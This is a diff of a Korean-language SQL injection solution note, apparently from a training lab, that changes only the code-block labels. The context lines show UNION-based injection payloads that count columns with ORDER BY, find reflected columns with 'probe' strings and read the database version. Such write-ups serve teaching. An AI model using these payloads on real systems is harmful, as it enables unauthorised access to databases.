@@ -32,7 +32,7 @@ note_kind: solution
 
 **실행:**
 
-~~~sql nohighlight
+~~~sql fragment
 ' ORDER BY 1 --
 ~~~
 
@@ -46,7 +46,7 @@ note_kind: solution
 
 **실행:**
 
-~~~sql nohighlight
+~~~sql fragment
 ' -- -
 ' ORDER BY 1 -- -
 ~~~
@@ -61,7 +61,7 @@ note_kind: solution
 
 **실행:**
 
-~~~sql nohighlight
+~~~sql fragment
 ' ORDER BY 1 -- -
 ' ORDER BY 2 -- -
 ' ORDER BY 3 -- -
@@ -77,7 +77,7 @@ note_kind: solution
 
 첫 번째 열에 `probe`를 넣었다.
 
-~~~sql nohighlight
+~~~sql fragment
 ' UNION SELECT 'probe', NULL -- -
 ~~~
 
@@ -87,7 +87,7 @@ note_kind: solution
 
 두 번째 열에 같은 문자열을 넣었다.
 
-~~~sql nohighlight
+~~~sql fragment
 ' UNION SELECT NULL, 'probe' -- -
 ~~~
 
@@ -105,7 +105,7 @@ note_kind: solution
 
 **실행:**
 
-~~~sql nohighlight
+~~~sql fragment
 ' UNION SELECT @@version, NULL -- -
 ~~~
 
